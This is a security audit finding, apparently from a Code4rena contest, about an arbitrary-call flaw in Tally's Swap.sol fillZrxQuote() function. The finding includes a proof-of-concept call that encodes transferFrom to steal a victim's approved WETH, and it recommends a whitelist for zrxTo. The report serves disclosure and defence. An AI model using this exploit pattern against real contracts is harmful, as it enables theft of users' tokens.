## Tags

- bug
- 3 (High Risk)
- sponsor confirmed

# [Arbitrary contract call allows attackers to steal ERC20 from users' wallets](https://github.com/code-423n4/2021-10-tally-findings/issues/37) 

# Handle

WatchPug


# Vulnerability details

https://github.com/code-423n4/2021-10-tally/blob/c585c214edb58486e0564cb53d87e4831959c08b/contracts/swap/Swap.sol#L200-L212

```solidity
function fillZrxQuote(
    IERC20 zrxBuyTokenAddress,
    address payable zrxTo,
    bytes calldata zrxData,
    uint256 ethAmount
) internal returns (uint256, uint256) {
    uint256 originalERC20Balance = 0;
    if(!signifiesETHOrZero(address(zrxBuyTokenAddress))) {
        originalERC20Balance = zrxBuyTokenAddress.balanceOf(address(this));
    }
    uint256 originalETHBalance = address(this).balance;

    (bool success,) = zrxTo.call{value: ethAmount}(zrxData);
```

A call to an arbitrary contract with custom calldata is made in `fillZrxQuote()`, which means the contract can be an ERC20 token, and the calldata can be `transferFrom` a previously approved user.

### Impact

The wallet balances (for the amount up to the allowance limit) of the tokens that users approved to the contract can be stolen.

### PoC

Given:

- Alice has approved 1000 WETH to `Swap.sol`;

The attacker can:

```
TallySwap.swapByQuote(
    address(WETH),
    0,
    address(WETH),
    0,
    address(0),
    address(WETH),
    abi.encodeWithSignature(
        "transferFrom(address,address,uint256)",
        address(Alice),
        address(this),
        1000 ether
    )
)
```

As a result, 1000 WETH will be stolen from Alice and sent to the attacker.

This PoC has been tested on a forking network.

### Recommendation

Consider adding a whitelist for `zrxTo` addresses.

